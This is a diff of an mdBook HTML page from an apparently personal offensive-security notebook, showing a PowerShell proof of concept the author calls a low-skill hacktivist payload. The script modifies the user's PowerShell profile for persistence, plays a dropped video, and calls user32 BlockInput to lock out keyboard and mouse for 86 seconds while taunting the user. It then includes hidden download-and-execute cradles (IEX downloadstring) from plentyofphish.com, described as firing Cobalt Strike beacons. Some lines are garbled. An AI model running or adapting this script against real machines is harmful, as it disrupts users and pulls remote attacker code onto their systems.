@@ -4,7 +4,7 @@
 
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Tome two, Powershell Hexing - A Wizards Tomes</title>
+        <title>Powershell Hexing - A Wizards Tomes</title>
 
 
         <!-- Custom HTML head -->
@@ -88,7 +88,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html" class="active"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li><li class="chapter-item expanded "><a href="Tome3.html"><strong aria-hidden="true">4.</strong> Tome three, Embedded magic</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="Wizardintro.html">A Wizards Legacy</a></li><li class="chapter-item expanded affix "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> Offensive Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">1.1.</strong> Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html" class="active"><strong aria-hidden="true">1.2.</strong> Powershell Hexing</a></li><li class="chapter-item expanded "><a href="Tome2.html"><strong aria-hidden="true">1.3.</strong> Git with vengeance</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Defensive Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="TomeBooger.html"><strong aria-hidden="true">2.1.</strong> Booger Goblin</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Development Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome3.html"><strong aria-hidden="true">3.1.</strong> Embedded magic</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Infrastructure Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome5.html"><strong aria-hidden="true">4.1.</strong> A Dell Incantation</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Forbidden Wizard Magics</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> PlaceHolder</div></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Yapping Crystal</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome4.html"><strong aria-hidden="true">6.1.</strong> A Wizards Jade</a></li><li class="chapter-item expanded "><a href="ics/ics1.html"><strong aria-hidden="true">6.2.</strong> A tale of Trains</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -156,7 +156,7 @@
 <hr />
 <p>This was a very bad working PoC about powershell lock outs and doing some direct DLL manipulation.</p>
 <p>Below is a .ps1 script that would drop this below script, A video, and a dumb beacon.</p>
-<p>The goal of this was to act as a Hacktavist or some skid effect on a computer. It was very dumb but it was a perfect payload to mimic low skill and low complexity attack. </p>
+<p>The goal of this was to act as a Hacktavist or some skid effect on a computer. It was very dumb but it was a perfect payload to mimic low skill and low complexity attack.</p>
 <h3 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h3>
 <ol>
 <li>
@@ -172,13 +172,13 @@
 <p>I then have the Windows media player Open the Media file, Then close the file. At the time I did this to solve a bug in the way it opens files.</p>
 </li>
 <li>
-<p>Working with the proc var I made it brings the Windows MediaPlayer and plays the video. </p>
+<p>Working with the proc var I made it brings the Windows MediaPlayer and plays the video.</p>
 </li>
 <li>
-<p>Now we see the DLLImport for user32.Dll I am calling very poorly the BlockIt function. Setting that to true disables all user32 input. Mouse, Keyboard, Touchscreen and anything else handled on the user. </p>
+<p>Now we see the DLLImport for user32.Dll I am calling very poorly the BlockIt function. Setting that to true disables all user32 input. Mouse, Keyboard, Touchscreen and anything else handled on the user.</p>
 </li>
 <li>
-<p>We see some mocking of the user and a sleep timers for 86 seconds. Once that is finished we return the BlockInput to false and fire off two CS beacons that are laying in wait online. </p>
+<p>We see some mocking of the user and a sleep timers for 86 seconds. Once that is finished we return the BlockInput to false and fire off two CS beacons that are laying in wait online.</p>
 </li>
 </ol>
 <pre><code class="language-Powershell">
@@ -196,21 +196,21 @@ Set-Content -Path $profile -Value $content
 
 
 Set-CoAdd-Type -AssemblyName presentationCore
-$filepath = &quot;C:\Windows\Temp\trap.mp4&quot;
+$filepath = "C:\Windows\Temp\trap.mp4"
 $wmplayer = New-Object System.Windows.Media.MediaPlayer
 $wmplayer.Open($filepath)
 Start-Sleep 1 
 $duration = $wmplayer.NaturalDuration.TimeSpan.Seconds
 $wmplayer.Close()
 start playing
-$proc = Start-process -FilePath &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot; -ArgumentList $filepath -PassThru
+$proc = Start-process -FilePath "C:\Program Files (x86)\Windows Media Player\wmplayer.exe" -ArgumentList $filepath -PassThru
 
 
 
 # This Bit locks the user out for 86 seconds
 
 $code = @'
-    [DllImport(&quot;user32.dll&quot;)]
+    [DllImport("user32.dll")]
         public static extern bool BlockInput(bool fBlockIt);
 '@
         
@@ -219,7 +219,7 @@ $code = @'
         
         $null = $userInput::BlockInput($true)
         
-Write-Warning &quot;You have just fell for the trap...&quot;
+Write-Warning "You have just fell for the trap..."
 
         Start-Sleep -Seconds 86
         
@@ -230,8 +230,8 @@ Write-Warning &quot;You have just fell for the trap...&quot;
 
 Set-StrictMode -Version 2
 
-#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))&quot;
-#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))&quot;
+#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))"
+#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))"
 
 #Runs above payloads
 
@@ -246,7 +246,7 @@ Set-StrictMode -Version 2
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
-                            <a rel="next" href="Tome3.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next" href="Tome2.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
 
@@ -260,7 +260,7 @@ Set-StrictMode -Version 2
                         <i class="fa fa-angle-left"></i>
                     </a>
 
-                    <a rel="next" href="Tome3.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next" href="Tome2.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
